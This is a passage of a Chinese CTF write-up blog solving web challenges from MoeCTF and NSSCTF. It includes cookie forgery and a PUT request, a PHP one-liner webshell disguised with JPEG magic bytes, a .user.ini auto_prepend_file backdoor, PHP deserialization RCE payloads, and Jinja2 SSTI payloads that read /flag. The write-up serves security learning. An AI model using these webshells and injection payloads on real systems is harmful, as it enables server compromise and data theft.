<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /heart_seal HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: user=xt; role=xt; auth=1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag5:M2xfMTVfcjM0</span><br><span class="line">&lt;a href=&quot;/pathfinder&quot;&gt;前往第六关：前尘傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.5.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /pathfinder HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Referer: http://panshi/entry</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag6:bGx5X2gxOWgh</span><br><span class="line">&lt;a href=&quot;/void_rebirth&quot;&gt;前往第七关：逆转傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">玉板铭文：阴阳逆乱，归墟可填。以&quot;覆&quot;代&quot;取&quot;，塑吾新生</span><br><span class="line"></span><br><span class="line">使用PUT方法，请求体为&quot;新生！&quot;</span><br><span class="line"></span><br><span class="line"> 请使用工具发送PUT请求</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_put_request_and_save():</span><br><span class="line">    url = &quot;http://127.0.0.1:56205/void_rebirth&quot;</span><br><span class="line">    data = &quot;新生！&quot;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Host&quot;: &quot;127.0.0.1:56205&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Connection&quot;: &quot;close&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;text/plain; charset=utf-8&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        response = requests.put(url, data=data.encode(&#x27;utf-8&#x27;), headers=headers)</span><br><span class="line">        print(f&quot;状态码: &#123;response.status_code&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        # 保存响应到文件</span><br><span class="line">        with open(&quot;response.html&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:</span><br><span class="line">            f.write(response.text)</span><br><span class="line">        print(&quot;响应已保存到 response.html 文件中&quot;)</span><br><span class="line"></span><br><span class="line">        # 检查是否包含成功关键词</span><br><span class="line">        if &quot;成功&quot; in response.text or &quot;通过&quot; in response.text:</span><br><span class="line">            print(&quot;✓ 恭喜！挑战成功！&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;响应内容已保存，请查看文件确认结果&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;请求出错: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_put_request_and_save()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0MwbjZyNDd1MTQ3 MTBuNV95MHVyX2g3N1BfbDN2M2xfMTVfcjM0bGx5X2gxOWghfQ==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="第十三章-通幽关·灵纹诡影"><a href="#第十三章-通幽关·灵纹诡影" class="headerlink" title="第十三章 通幽关·灵纹诡影"></a>第十三章 通幽关·灵纹诡影</h3><p>文件上传的题目</p>
<ul>
<li>仅受仙灵之气浸润的「云纹图」可修复玉魄核心（建议扩展名：.jpg）</li>
<li>灵纹尺寸不得大于三寸（30000字节）</li>
<li>灵纹必须包含噬心魔印（十六进制校验码：FFD8FF）</li>
<li>违禁灵纹将触发九幽雷劫，魂飞魄散！</li>
</ul>
<p>要求头部是FFD8FF，扩展名：.jpg</p>
<p>脚本生成一句话木马</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成flag.jpg文件，头部为FFD8FF，后面接指定PHP代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_flag_jpg</span>(<span class="params">filename=<span class="string">&quot;flag.jpg&quot;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># JPEG文件头部字节: FFD8FF</span></span><br><span class="line">        jpg_header = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;FFD8FF&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 要添加的PHP代码</span></span><br><span class="line">        php_code = <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将PHP代码转换为字节</span></span><br><span class="line">        php_bytes = php_code.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 合并头部和PHP代码</span></span><br><span class="line">        file_content = jpg_header + php_bytes</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 写入文件</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(file_content)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;filename&#125;</span> 生成成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件大小: <span class="subst">&#123;<span class="built_in">len</span>(file_content)&#125;</span> 字节&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;生成文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_flag_jpg()</span><br></pre></td></tr></table></figure>

<p>然后抓包，再send,有点要注意就是FFD8FF要在HEX里改一下，然后flag.jpg改成php再上传。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:56088</span><br><span class="line">Content-Length: 224</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://127.0.0.1:56088</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1:56088/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA</span><br><span class="line">Content-Disposition: form-data; name=&quot;spiritPattern&quot;; filename=&quot;flag.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">ÿØÿ&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">------WebKitFormBoundarynIFBmbukzvUMjAFA--</span><br></pre></td></tr></table></figure>

<p>最后用蚁剑连接一下后门就可以得到flag了。</p>
<h3 id="第十七章-星骸迷阵·神念重构"><a href="#第十七章-星骸迷阵·神念重构" class="headerlink" title="第十七章 星骸迷阵·神念重构"></a>第十七章 星骸迷阵·神念重构</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>应用接受用户输入的GET参数<code>a</code></li>
<li>直接对输入进行反序列化操作，没有进行任何过滤或验证</li>
<li>类A的<code>__destruct</code>方法中使用<code>eval()</code>执行类属性<code>$a</code>的内容</li>
<li>当对象被销毁时，会自动调用<code>__destruct</code>方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>; <span class="comment">// 使用system执行ls命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL编码后的序列化字符串:</span><br><span class="line">O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br><span class="line"></span><br><span class="line">原始序列化字符串:</span><br><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:15:&quot;system(&#x27;ls /&#x27;);&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A15%3A%22system%28%27ls+%2F%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125; app bin dev entrypoint.sh etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>

<p>看到flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$serialized</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始序列化字符串:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:58283/index.php/?a=O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>发送即可获得flag</p>
<h3 id="ez-SSTI"><a href="#ez-SSTI" class="headerlink" title="ez_SSTI"></a>ez_SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你的名字是？(use ?name= in url)</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">欢迎 49</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>

<p>paylaod1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28531/ssti?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">欢迎 NSSCTF&#123;6e72997c-2192-4ec3-98a1-3404123b90cd&#125;</span><br><span class="line">你已经掌握ssti的精髓了，开始读取flag吧！！🫡</span><br><span class="line">提示模板是Jinja2，参考文章https://www.cnblogs.com/hetianlab/p/17273687.html🤪</span><br><span class="line">推荐工具fenjing，可上网下载，也可进群咨询😉</span><br></pre></td></tr></table></figure>

<h3 id="第二十章-幽冥血海·幻语心魔"><a href="#第二十章-幽冥血海·幻语心魔" class="headerlink" title="第二十章 幽冥血海·幻语心魔"></a>第二十章 幽冥血海·幻语心魔</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># ... 此处存在SSTI漏洞</span></span><br><span class="line">        login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>首先验证是否存在SSTI漏洞，使用简单的数学表达式测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;7*7&#125;&#125;&amp;password=test</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">阵法反馈</span><br><span class="line">Welcome: 49</span><br></pre></td></tr></table></figure>

<p>存在SSTI漏洞</p>
<p>Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;().__class__.__base__.__subclasses__()[X].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&amp;password=any</span><br></pre></td></tr></table></figure>



<h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>.user.ini 是 PHP 配置文件 php.ini 的补充文件。当通过 Web 服务器访问 PHP 页面时，PHP 会在当前执行的脚本所在目录及其上层目录中查找是否存在 .user.ini 文件。如果找到，便会将其中的配置指令合并到主 php.ini 设置中，并作为 CGI 或 FastCGI 进程的启动参数。</p>
<p>虽然 php.ini 限制了许多关键配置仅能在全局范围内修改，但 .user.ini 仍允许用户控制部分设置，其中之一便是 <code>auto_prepend_file</code> 指令。该指令用于指定一个文件，PHP 会在执行同一目录下的所有脚本之前自动包含该文件，使其成为脚本执行的预处理部分。</p>
<p>利用这一机制，攻击者可上传一个自定义的 .user.ini 文件，并通过设置 <code>auto_prepend_file</code> 指向某个包含恶意代码（如一句话木马）的文件。此后，只要访问该目录下的任何 PHP 脚本，都会自动加载该恶意文件，从而实现持久化的代码执行能力。为进一步完成攻击，攻击者通常还需上传一个包含恶意代码的预包含文件。</p>
<p>文件一</p>
<p>sh.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>文件二</p>
<p>.user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = sh.jpg</span><br></pre></td></tr></table></figure>

<p>用蚁剑连接即可</p>
<h3 id="看看ip"><a href="#看看ip" class="headerlink" title="看看ip"></a>看看ip</h3><p>抓包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /?format=json HTTP/1.1</span><br><span class="line">Host: api.ipify.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:23286/</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:23286</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: 